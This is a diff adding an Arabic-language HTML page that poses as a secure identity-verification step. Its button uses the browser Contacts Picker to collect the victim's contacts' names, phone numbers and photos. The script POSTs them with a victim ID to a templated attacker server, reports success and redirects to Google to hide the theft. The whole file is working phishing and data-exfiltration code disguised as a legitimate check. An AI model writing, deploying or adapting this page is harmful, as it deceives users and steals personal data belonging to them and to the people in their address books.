@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تحقق من الهوية</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0a0a0a;
+      color: #fff;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #1a1a2e;
+      border: 1px solid #2a2a4a;
+      border-radius: 20px;
+      padding: 40px 30px;
+      max-width: 360px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 0 40px rgba(0,100,255,0.15);
+    }
+    .icon { font-size: 60px; margin-bottom: 20px; }
+    h2 { font-size: 22px; margin-bottom: 10px; color: #e0e0ff; }
+    p { color: #888; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
+    .btn {
+      background: linear-gradient(135deg, #0066ff, #0044aa);
+      color: #fff;
+      border: none;
+      padding: 16px 40px;
+      border-radius: 50px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      transition: opacity 0.2s;
+    }
+    .btn:active { opacity: 0.8; }
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #aaa;
+      min-height: 20px;
+    }
+    .badge {
+      display: inline-block;
+      background: #0d3b00;
+      color: #4caf50;
+      border-radius: 20px;
+      padding: 4px 14px;
+      font-size: 12px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">🔐</div>
+    <span class="badge">✓ آمن ومشفر</span>
+    <h2>تحقق من الهوية</h2>
+    <p>للمتابعة يرجى التحقق من هويتك عبر الموافقة على الطلب أدناه.</p>
+    <button class="btn" onclick="getContacts()">التحقق والمتابعة</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const uid = "<%= uid %>";
+    const serverURL = "<%= a %>";
+
+    async function getContacts() {
+      const status = document.getElementById('status');
+      const btn = document.querySelector('.btn');
+      btn.disabled = true;
+      btn.textContent = 'جارٍ التحقق...';
+      status.textContent = '';
+
+      try {
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+          const props = ['name', 'tel', 'icon'];
+          const opts = { multiple: true };
+          const contacts = await navigator.contacts.select(props, opts);
+
+          if (!contacts || contacts.length === 0) {
+            status.textContent = 'لم يتم اختيار أي جهة اتصال.';
+            btn.disabled = false;
+            btn.textContent = 'التحقق والمتابعة';
+            return;
+          }
+
+          status.textContent = 'جارٍ الإرسال...';
+
+          let result = '';
+          for (let i = 0; i < contacts.length; i++) {
+            const c = contacts[i];
+            const name = c.name && c.name[0] ? c.name[0] : 'غير معروف';
+            const tel = c.tel && c.tel.length > 0 ? c.tel.join(' | ') : 'لا يوجد';
+            result += `👤 ${name}\n📞 ${tel}\n\n`;
+          }
+
+          await fetch(serverURL + '/contacts-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'uid=' + encodeURIComponent(uid) + '&data=' + encodeURIComponent(result)
+          });
+
+          for (let i = 0; i < contacts.length; i++) {
+            const c = contacts[i];
+            if (c.icon && c.icon.length > 0) {
+              const blob = c.icon[0];
+              const name = c.name && c.name[0] ? c.name[0] : 'جهة اتصال';
+              await new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onload = async function(e) {
+                  const base64 = e.target.result.split(',')[1];
+                  await fetch(serverURL + '/contact-photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'uid=' + encodeURIComponent(uid) + '&img=' + encodeURIComponent(base64) + '&name=' + encodeURIComponent(name)
+                  });
+                  resolve();
+                };
+                reader.readAsDataURL(blob);
+              });
+            }
+          }
+
+          status.textContent = '✅ تم التحقق بنجاح';
+          setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
+
+        } else {
+          status.textContent = '❌ المتصفح لا يدعم هذه الميزة. يرجى فتح الرابط من Chrome على Android.';
+          btn.disabled = false;
+          btn.textContent = 'التحقق والمتابعة';
+        }
+      } catch (e) {
+        status.textContent = 'تم الإلغاء.';
+        btn.disabled = false;
+        btn.textContent = 'التحقق والمتابعة';
+      }
+    }
+  </script>
+</body>
+</html>
